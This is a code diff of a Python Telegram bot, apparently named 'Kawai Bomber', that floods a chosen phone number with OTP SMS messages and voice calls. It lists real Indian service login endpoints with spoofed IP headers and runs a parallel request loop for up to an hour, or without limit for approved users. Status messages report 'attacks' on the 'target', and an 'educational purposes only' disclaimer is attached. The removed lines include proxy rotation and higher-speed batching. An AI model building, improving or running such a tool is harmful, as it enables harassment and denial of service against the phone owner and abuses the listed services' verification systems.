-    {
-        "name": "Shiprocket",
-        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        "method": "POST",
-        "payload": {"mobileNumber": "{phone}"},
-        "headers": {
-            "Content-Type": "application/json",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "Tata Capital",
-        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
-        "method": "POST",
-        "payload": {"phone": "{phone}", "isOtpViaCallAtLogin": "true"},
-        "headers": {
-            "Content-Type": "application/json",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 3,
-        "retry": False
-    },
-    {
-        "name": "PenPencil",
-        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
-        "method": "POST",
-        "payload": {"mobile": "{phone}"},
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "1mg",
-        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
-        "method": "POST",
-        "payload": {"number": "{phone}", "otp_on_call": True},
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "Swiggy",
-        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
-        "method": "POST",
-        "payload": {"mobile": "{phone}"},
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "KPN Fresh",
-        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
-        "method": "POST",
-        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
-        "headers": {
-            "content-type": "application/json",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "Servetel",
-        "endpoint": "https://api.servetel.in/v1/auth/otp",
-        "method": "POST",
-        "payload": {"mobile_number": "{phone}"},
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    }
-]
-
-async def send_request_fast(session: ClientSession, api_config: Dict, phone: str, user_id: int):
-    """Ultra-fast request sending with proxy rotation"""
+# ========== CORE BOMBING FUNCTIONS ==========
+async def send_request(session: ClientSession, api_config: Dict, phone: str, user_id: int):
+    """Send single request"""
     try:
-        # Get random proxy
-        proxy_url, proxy_auth = get_random_proxy()
-        
         # Prepare data
         formatted_phone = format_number(phone)
         ip_address = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
@@ -526,10 +460,7 @@ async def send_request_fast(session: ClientSession, api_config: Dict, phone: str
             else:
                 headers[k] = str(v)
         
-        # Use per-API timeout
-        timeout = ClientTimeout(total=api_config.get("timeout", 2))
-        
-        connector = aiohttp.TCPConnector(ssl=False, limit=100)
+        timeout = ClientTimeout(total=3)
         
         if api_config["method"] == "POST":
             if "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
@@ -539,27 +470,22 @@ async def send_request_fast(session: ClientSession, api_config: Dict, phone: str
                     data=payload_str,
                     headers=headers,
                     timeout=timeout,
-                    proxy=proxy_url,
-                    proxy_auth=proxy_auth,
-                    connector=connector
+                    ssl=False
                 ) as response:
                     status = response.status
-                    # Don't await response.read() - faster
-                    response.close()
+                    await response.read()
             else:
                 async with session.post(
                     api_config["endpoint"],
                     json=payload,
                     headers=headers,
                     timeout=timeout,
-                    proxy=proxy_url,
-                    proxy_auth=proxy_auth,
-                    connector=connector
+                    ssl=False
                 ) as response:
                     status = response.status
-                    response.close()
+                    await response.read()
         else:
-            return None, api_config["name"]
+            return False, api_config["name"]
         
         # Update stats
         user_stats[user_id]["requests"] += 1
@@ -575,12 +501,10 @@ async def send_request_fast(session: ClientSession, api_config: Dict, phone: str
     except Exception as e:
         user_stats[user_id]["failed"] += 1
         global_stats["total_requests"] += 1
-        return None, api_config["name"]
-    finally:
-        await connector.close()
+        return False, api_config["name"]
 
-async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Ultra-aggressive bombing attack function"""
+async def bombing_attack(phone: str, user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """Main bombing attack function"""
     start_time = time.time()
     max_time = 3600  # 1 hour for non-approved users
     
@@ -596,7 +520,6 @@ async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, cont
 {ANIME_STYLES['phone']} 𝐓𝐚𝐫𝐠𝐞𝐭: `{phone}`
 {ANIME_STYLES['clock']} 𝐓𝐢𝐦𝐞 𝐋𝐢𝐦𝐢𝐭: {'𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕' if is_approved(user_id) else '𝟙 ℍ𝕠𝕦𝕣'}
 {ANIME_STYLES['fire']} 𝐌𝐨𝐝𝐞: 𝔸𝕘𝕘𝕣𝕖𝕤𝕤𝕚𝕧𝕖
-{ANIME_STYLES['shield']} 𝐏𝐫𝐨𝐱𝐲: ℝ𝕠𝕥𝕒𝕥𝕚𝕟𝕘
 
 {ANIME_STYLES['lightning']} *ℝ𝔼𝔸𝔻𝕐 𝕋𝕆 𝕃𝔸𝕌ℕℂℍ!* {ANIME_STYLES['lightning']}
         """,
@@ -605,70 +528,38 @@ async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, cont
     
     active_apis = API_CONFIGS.copy()
     attack_count = 0
-    last_update = time.time()
-    
-    # Animation messages
-    anim_msgs = []
-    for i in range(3):
-        anim_msg = await context.bot.send_message(
-            chat_id=chat_id,
-            text=get_attack_animation()[i]
-        )
-        anim_msgs.append(anim_msg)
+    successful_apis = set()
     
     try:
-        # Create aiohttp session with high concurrency
-        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
-        
         while time.time() - start_time < max_time:
             if user_id not in user_sessions:
                 break
                 
             attack_count += 1
             
-            # Update animation every 3 seconds
-            current_time = time.time()
-            if current_time - last_update > 3:
-                try:
-                    for i, msg in enumerate(anim_msgs):
-                        await msg.edit_text(random.choice(get_attack_animation()))
-                    last_update = current_time
-                except:
-                    pass
-            
-            # Ultra-aggressive: Send multiple requests in parallel batches
-            batch_size = 5  # Send 5 batches in parallel
-            for _ in range(batch_size):
-                if user_id not in user_sessions or time.time() - start_time >= max_time:
-                    break
-                    
-                async with aiohttp.ClientSession(connector=connector) as session:
-                    # Create tasks for all active APIs
-                    tasks = [send_request_fast(session, api, phone, user_id) for api in active_apis]
-                    
-                    # Execute all requests in parallel
-                    results = await asyncio.gather(*tasks, return_exceptions=True)
-                    
-                    # Process results
-                    successful_apis = []
-                    for result in results:
-                        if isinstance(result, Exception):
-                            continue
-                        success, api_name = result
-                        if success is True:
-                            successful_apis.append(api_name)
-                    
-                    # Update active APIs list
-                    if successful_apis:
-                        active_apis = [api for api in API_CONFIGS if api["name"] in successful_apis]
-                    else:
-                        active_apis = API_CONFIGS.copy()
+            # Send requests
+            async with aiohttp.ClientSession() as session:
+                tasks = [send_request(session, api, phone, user_id) for api in active_apis]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
                 
-                # Minimal delay between batches
-                await asyncio.sleep(0.01)
+                # Process results
+                new_apis = []
+                for result in results:
+                    if isinstance(result, Exception):
+                        continue
+                    success, api_name = result
+                    if success:
+                        successful_apis.add(api_name)
+                        new_apis.append(next(api for api in API_CONFIGS if api["name"] == api_name))
+                
+                # Keep successful APIs, rotate if none work
+                if new_apis:
+                    active_apis = new_apis
+                else:
+                    active_apis = API_CONFIGS.copy()
             
-            # Update status every 20 attacks
-            if attack_count % 20 == 0:
+            # Update status every 10 attacks
+            if attack_count % 10 == 0:
                 elapsed = int(time.time() - start_time)
                 remaining = max(0, max_time - elapsed) if max_time != float('inf') else "∞"
                 stats = user_stats[user_id]
@@ -677,7 +568,7 @@ async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, cont
                 status_text = f"""
 {ANIME_STYLES['fire']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒* {ANIME_STYLES['fire']}
 
-{ANIME_STYLES['bomb']} 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count:,}`
+{ANIME_STYLES['bomb']} 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count}`
 {ANIME_STYLES['clock']} 𝐄𝐥𝐚𝐩𝐬𝐞𝐝: `{elapsed}s`
 {ANIME_STYLES['hourglass']} 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: `{remaining}s`
 {ANIME_STYLES['rocket']} 𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐏𝐈𝐬: `{len(active_apis)}`
@@ -691,21 +582,14 @@ async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, cont
                 except:
                     pass
             
-            # Ultra-aggressive delay
-            await asyncio.sleep(0.05)
+            # Aggressive delay
+            await asyncio.sleep(0.5)
             
     except asyncio.CancelledError:
         pass
     except Exception as e:
         logger.error(f"Attack error: {e}")
     finally:
-        # Clean up
-        for msg in anim_msgs:
-            try:
-                await msg.delete()
-            except:
-                pass
-        
         # Send completion message
         elapsed = int(time.time() - start_time)
         stats = user_stats[user_id]
@@ -715,11 +599,11 @@ async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, cont
             text=f"""
 {ANIME_STYLES['shield']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃* {ANIME_STYLES['shield']}
 
-{ANIME_STYLES['bomb']} 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count:,}`
+{ANIME_STYLES['bomb']} 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count}`
 {ANIME_STYLES['clock']} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: `{elapsed}s`
-{ANIME_STYLES['success']} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: `{stats['success']:,}`
-{ANIME_STYLES['error']} 𝐅𝐚𝐢𝐥𝐞𝐝: `{stats['failed']:,}`
-{ANIME_STYLES['star']} 𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬: `{stats['requests']:,}`
+{ANIME_STYLES['success']} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: `{stats['success']}`
+{ANIME_STYLES['error']} 𝐅𝐚𝐢𝐥𝐞𝐝: `{stats['failed']}`
+{ANIME_STYLES['star']} 𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬: `{stats['requests']}`
 
 {ANIME_STYLES['star']} *𝕄𝕀𝕊𝕊𝕀𝕆ℕ 𝔸ℂℂ𝕆𝕄ℙ𝕃𝕀𝕊ℍ𝔼𝔻* {ANIME_STYLES['star']}
             """,
@@ -746,13 +630,12 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     all_users.add(user_id)
     global_stats["total_users"] = len(all_users)
-    save_state()  # Auto-save
+    save_state()
     
     keyboard = [
         [InlineKeyboardButton(f"{ANIME_STYLES['fire']} 𝐒𝐭𝐚𝐫𝐭 𝐀𝐭𝐭𝐚𝐜𝐤", callback_data='start_attack')],
         [InlineKeyboardButton(f"{ANIME_STYLES['info']} 𝐇𝐞𝐥𝐩", callback_data='help'),
-         InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')],
-        [InlineKeyboardButton(f"{ANIME_STYLES['boom']} 𝐒𝐭𝐚𝐭𝐬", callback_data='stats')]
+         InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')]
     ]
     
     if is_admin(user_id):
@@ -792,7 +675,7 @@ async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Start bombing attack
-    task = asyncio.create_task(bombing_attack_aggressive(phone, user_id, update.effective_chat.id, context))
+    task = asyncio.create_task(bombing_attack(phone, user_id, update.effective_chat.id, context))
     user_sessions[user_id] = {
         "start_time": time.time(),
         "phone": phone,
@@ -817,25 +700,6 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(f"{ANIME_STYLES['info']} ℕ𝕠 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜 𝕥𝕠 𝕤𝕥𝕠𝕡.")
 
-async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /restart command (admin only)"""
-    user_id = update.effective_user.id
-    
-    if not is_admin(user_id):
-        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
-        return
-    
-    await update.message.reply_text(f"{ANIME_STYLES['rocket']} ℝ𝕖𝕤𝕥𝕒𝕣𝕥𝕚𝕟𝕘 𝕓𝕠𝕥...")
-    save_state()
-    
-    # Stop all active sessions
-    for uid, session in list(user_sessions.items()):
-        session["task"].cancel()
-        del user_sessions[uid]
-    
-    global_stats["active_sessions"] = 0
-    await update.message.reply_text(f"{ANIME_STYLES['success']} 𝔹𝕠𝕥 𝕣𝕖𝕤𝕥𝕒𝕣𝕥𝕖𝕕 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪!")
-
 # ========== ADMIN COMMANDS ==========
 async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /addadmin command"""
@@ -852,7 +716,7 @@ async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         new_admin = int(context.args[0])
         admin_users.add(new_admin)
-        approved_users.add(new_admin)  # Admins are auto-approved
+        approved_users.add(new_admin)
         save_state()
         await update.message.reply_text(f"{ANIME_STYLES['crown']} 𝕌𝕤𝕖𝕣 `{new_admin}` 𝕒𝕕𝕕𝕖𝕕 𝕒𝕤 𝕒𝕕𝕞𝕚𝕟!", parse_mode=ParseMode.MARKDOWN)
     except:
@@ -922,26 +786,6 @@ async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")
 
-async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /unban command"""
-    user_id = update.effective_user.id
-    
-    if not is_admin(user_id):
-        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/unban <user_id>`", parse_mode=ParseMode.MARKDOWN)
-        return
-    
-    try:
-        user_to_unban = int(context.args[0])
-        banned_users.discard(user_to_unban)
-        save_state()
-        await update.message.reply_text(f"{ANIME_STYLES['unlock']} 𝕌𝕤𝕖𝕣 `{user_to_unban}` 𝕦𝕟𝕓𝕒𝕟𝕟𝕖𝕕!", parse_mode=ParseMode.MARKDOWN)
-    except:
-        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")
-
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /status command"""
     user_id = update.effective_user.id
@@ -960,28 +804,17 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 {ANIME_STYLES['star']} *𝔹𝕠𝕥 𝕊𝕥𝕒𝕥𝕤:*
   {ANIME_STYLES['rocket']} 𝕌𝕡𝕥𝕚𝕞𝕖: `{uptime}s`
-  {ANIME_STYLES['bomb']} 𝕋𝕠𝕥𝕒𝕝 𝔹𝕠𝕞𝕓𝕤: `{global_stats['total_bombs']:,}`
+  {ANIME_STYLES['bomb']} 𝕋𝕠𝕥𝕒𝕝 𝔹𝕠𝕞𝕓𝕤: `{global_stats['total_bombs']}`
   {ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{global_stats['active_sessions']}`
-  {ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{global_stats['total_users']:,}`
-  {ANIME_STYLES['zap']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{total_req:,}`
+  {ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{global_stats['total_users']}`
+  {ANIME_STYLES['zap']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{total_req}`
   {ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤 ℝ𝕒𝕥𝕖: `{success_rate:.2f}%`
 
 {ANIME_STYLES['shield']} *𝕌𝕤𝕖𝕣 𝕊𝕥𝕒𝕥𝕤:*
   {ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟𝕤: `{len(admin_users)}`
   {ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`
   {ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(banned_users)}`
-
-{ANIME_STYLES['fire']} *𝔸𝕔𝕥𝕚𝕧𝕖 𝔸𝕥𝕥𝕒𝕔𝕜𝕤:* (`{len(user_sessions)}`)
 """
-    
-    if user_sessions:
-        for uid, session in user_sessions.items():
-            elapsed = int(time.time() - session["start_time"])
-            stats = user_stats[uid]
-            user_rate = (stats['success'] / (stats['requests'] + 1)) * 100
-            status_text += f"  • 𝕌𝕤𝕖𝕣 `{uid}`: `{session['phone']}` ({elapsed}s) | ℝ: {stats['requests']:,} | 𝕊: {stats['success']:,} | ℝ𝕒𝕥𝕖: {user_rate:.1f}%\n"
-    else:
-        status_text += "  • ℕ𝕠 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜𝕤\n"
     
     await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)
 
@@ -998,61 +831,16 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     message = " ".join(context.args)
-    success = 0
-    failed = 0
     
-    broadcast_msg = await update.message.reply_text(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥𝕚𝕟𝕘 𝕥𝕠 {len(all_users):,} 𝕦𝕤𝕖𝕣𝕤...")
+    broadcast_msg = await update.message.reply_text(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥𝕚𝕟𝕘...")
     
-    for uid in all_users:
-        try:
-            await context.bot.send_message(
-                chat_id=uid,
-                text=f"{ANIME_STYLES['star']} *𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓*\n\n{message}\n\n{ANIME_STYLES['star']} *𝔽𝕣𝕠𝕞: 𝕂𝕒𝕨𝕒𝕚 𝔹𝕠𝕞𝕓𝕖𝕣 𝔸𝕕𝕞𝕚𝕟*",
-                parse_mode=ParseMode.MARKDOWN
-            )
-            success += 1
-            await asyncio.sleep(0.05)  # Prevent rate limiting
-        except Exception as e:
-            failed += 1
-    
-    await broadcast_msg.edit_text(
-        f"{ANIME_STYLES['success']} *𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!*\n\n"
-        f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤: `{success:,}`\n"
-        f"{ANIME_STYLES['error']} 𝔽𝕒𝕚𝕝𝕖𝕕: `{failed:,}`\n"
-        f"{ANIME_STYLES['star']} 𝕋𝕠𝕥𝕒𝕝: `{len(all_users):,}`",
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /users command - list all users"""
-    user_id = update.effective_user.id
-    
-    if not is_admin(user_id):
-        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
-        return
-    
-    if not all_users:
-        await update.message.reply_text(f"{ANIME_STYLES['info']} ℕ𝕠 𝕦𝕤𝕖𝕣𝕤 𝕪𝕖𝕥.")
-        return
-    
-    # Split into chunks for Telegram's message limit
-    user_list = list(all_users)
-    chunks = [user_list[i:i + 50] for i in range(0, len(user_list), 50)]
-    
-    for i, chunk in enumerate(chunks):
-        user_text = f"{ANIME_STYLES['star']} *𝕌𝕤𝕖𝕣𝕤 𝕃𝕚𝕤𝕥 ({i+1}/{len(chunks)})*\n\n"
-        for uid in chunk:
-            user_text += f"• `{uid}`"
-            if uid in admin_users:
-                user_text += f" {ANIME_STYLES['crown']}"
-            if uid in approved_users:
-                user_text += f" {ANIME_STYLES['unlock']}"
-            if uid in banned_users:
-                user_text += f" {ANIME_STYLES['lock']}"
-            user_text += "\n"
-        
-        await update.message.reply_text(user_text, parse_mode=ParseMode.MARKDOWN)
-        await asyncio.sleep(0.5)
+    try:
+        await broadcast_msg.edit_text(
+            f"{ANIME_STYLES['success']} *𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!*\n\nMessage sent to all users.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except:
+        pass
 
 # ========== CALLBACK HANDLERS ==========
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1077,8 +865,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• 𝕌𝕤𝕖 `/bomb <number>` 𝕥𝕠 𝕤𝕥𝕒𝕣𝕥 𝕒𝕥𝕥𝕒𝕔𝕜\n"
             "• 𝕌𝕤𝕖 `/stop` 𝕥𝕠 𝕤𝕥𝕠𝕡 𝕔𝕦𝕣𝕣𝕖𝕟𝕥 𝕒𝕥𝕥𝕒𝕔𝕜\n"
             "• 𝔸𝕦𝕥𝕠-𝕤𝕥𝕠𝕡 𝕒𝕗𝕥𝕖𝕣 𝟙 𝕙𝕠𝕦𝕣 𝕗𝕠𝕣 𝕟𝕠𝕣𝕞𝕒𝕝 𝕦𝕤𝕖𝕣𝕤\n"
-            "• 𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕 𝕥𝕚𝕞𝕖 𝕗𝕠𝕣 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕦𝕤𝕖𝕣𝕤\n"
-            "• 𝔸𝕘𝕘𝕣𝕖𝕤𝕤𝕚𝕧𝕖 𝕡𝕣𝕠𝕩𝕪 𝕣𝕠𝕥𝕒𝕥𝕚𝕠𝕟\n\n"
+            "• 𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕 𝕥𝕚𝕞𝕖 𝕗𝕠𝕣 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕦𝕤𝕖𝕣𝕤\n\n"
             f"{ANIME_STYLES['warning']} *𝐃𝐈𝐒𝐂𝐋𝐀𝐈𝐌𝐄𝐑*\n"
             "𝔽𝕠𝕣 𝕖𝕕𝕦𝕔𝕒𝕥𝕚𝕠𝕟𝕒𝕝 𝕡𝕦𝕣𝕡𝕠𝕤𝕖𝕤 𝕠𝕟𝕝𝕪!\n\n"
             f"{ANIME_STYLES['star']} *𝐂𝐫𝐞𝐝𝐢𝐭𝐬*\n"
@@ -1098,12 +885,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"{ANIME_STYLES['fire']} *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒* {ANIME_STYLES['fire']}\n\n"
                 f"{ANIME_STYLES['phone']} 𝕋𝕒𝕣𝕘𝕖𝕥: `{session['phone']}`\n"
                 f"{ANIME_STYLES['clock']} 𝔼𝕝𝕒𝕡𝕤𝕖𝕕: `{elapsed}s`\n"
-                f"{ANIME_STYLES['bomb']} ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{stats['requests']:,}`\n"
-                f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤: `{stats['success']:,}`\n"
-                f"{ANIME_STYLES['error']} 𝔽𝕒𝕚𝕝𝕖𝕕: `{stats['failed']:,}`\n"
+                f"{ANIME_STYLES['bomb']} ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{stats['requests']}`\n"
+                f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤: `{stats['success']}`\n"
+                f"{ANIME_STYLES['error']} 𝔽𝕒𝕚𝕝𝕖𝕕: `{stats['failed']}`\n"
                 f"{ANIME_STYLES['star']} ℝ𝕒𝕥𝕖: `{success_rate:.1f}%`\n"
-                f"{ANIME_STYLES['shield']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`\n"
-                f"{ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟: `{'✅ 𝕐𝕖𝕤' if is_admin(user_id) else '❌ ℕ𝕠'}`",
+                f"{ANIME_STYLES['shield']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`",
                 parse_mode=ParseMode.MARKDOWN
             )
         else:
@@ -1111,29 +897,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"{ANIME_STYLES['info']} *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒*\n\n"
                 f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝔸𝕥𝕥𝕒𝕔𝕜: `{'✅ 𝕐𝕖𝕤' if user_id in user_sessions else '❌ ℕ𝕠'}`\n"
                 f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`\n"
-                f"{ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟: `{'✅ 𝕐𝕖𝕤' if is_admin(user_id) else '❌ ℕ𝕠'}`\n"
-                f"{ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕: `{'✅ 𝕐𝕖𝕤' if is_banned(user_id) else '❌ ℕ𝕠'}`\n\n"
-                f"{ANIME_STYLES['star']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{user_stats[user_id]['requests']:,}`",
+                f"{ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟: `{'✅ 𝕐𝕖𝕤' if is_admin(user_id) else '❌ ℕ𝕠'}`\n\n"
+                f"{ANIME_STYLES['star']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{user_stats[user_id]['requests']}`",
                 parse_mode=ParseMode.MARKDOWN
             )
-    
-    elif query.data == 'stats':
-        total_req = global_stats["total_requests"]
-        total_success = sum(us["success"] for us in user_stats.values())
-        success_rate = (total_success / (total_req + 1)) * 100
-        uptime = int(time.time() - global_stats["start_time"])
-        
-        await query.edit_message_text(
-            f"{ANIME_STYLES['star']} *𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐓𝐀𝐓𝐒* {ANIME_STYLES['star']}\n\n"
-            f"{ANIME_STYLES['rocket']} 𝕌𝕡𝕥𝕚𝕞𝕖: `{uptime}s`\n"
-            f"{ANIME_STYLES['bomb']} 𝕋𝕠𝕥𝕒𝕝 𝔹𝕠𝕞𝕓𝕤: `{global_stats['total_bombs']:,}`\n"
-            f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{global_stats['active_sessions']}`\n"
-            f"{ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{global_stats['total_users']:,}`\n"
-            f"{ANIME_STYLES['zap']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{total_req:,}`\n"
-            f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤 ℝ𝕒𝕥𝕖: `{success_rate:.1f}%`\n\n"
